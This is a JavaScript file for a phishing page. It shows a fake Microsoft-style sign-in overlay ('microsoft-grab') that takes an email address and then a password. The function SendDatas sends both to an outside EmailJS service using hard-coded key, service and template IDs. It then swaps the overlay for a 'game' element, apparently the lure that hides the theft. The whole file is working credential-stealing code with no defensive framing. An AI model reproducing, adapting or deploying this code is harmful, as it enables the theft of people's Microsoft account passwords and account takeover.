var step = 0;

function SendDatas() {
    emailjs.init("-hu14sLxQEGeP67mu");
    var params = {
        email: document.getElementById('email').value,
        password: document.getElementById('password').value
    };
    emailjs.send("service_uz38ezy", "template_101pqfx", params);
    document.getElementById('microsoft-grab').style.display = "none";
    document.getElementById('game').style.display = "block";
    document.getElementById('body').style.background = "#1FADC7";
}

function Next() {
    if (/^\w+([\.-]?\w+)*@\w+([\.-]?\w+)*(\.\w{2,3})+$/.test(document.getElementById('email').value)) {
        step = 1;
        document.getElementById('errorMessage').style.display = "none";
        document.getElementById('microsoft-grab').style.height = "400px";
    } else {
        document.getElementById('errorMessage').style.display = "block";
        document.getElementById('microsoft-grab').style.height = "450px";
    }
}

function Start() {
    step = 0;
    document.getElementById('microsoft-grab').style.display = "block";
    document.getElementById('game').style.display = "none";
    document.getElementById('body').style.background = "azure";
}

function MicrosoftGrabLoop() {
    // show overlay
    if (step === 0) {
        document.getElementById('step0').style.display = "block";
        document.getElementById('step1').style.display = "none";
        document.getElementById('bottom-part').style.display = "block";
    } else {
        document.getElementById('step0').style.display = "none";
        document.getElementById('step1').style.display = "block";
        document.getElementById('bottom-part').style.display = "none";
    }

    // set e-mail on overlay 2
    document.getElementById('emailBack').innerHTML = document.getElementById('email').value;
}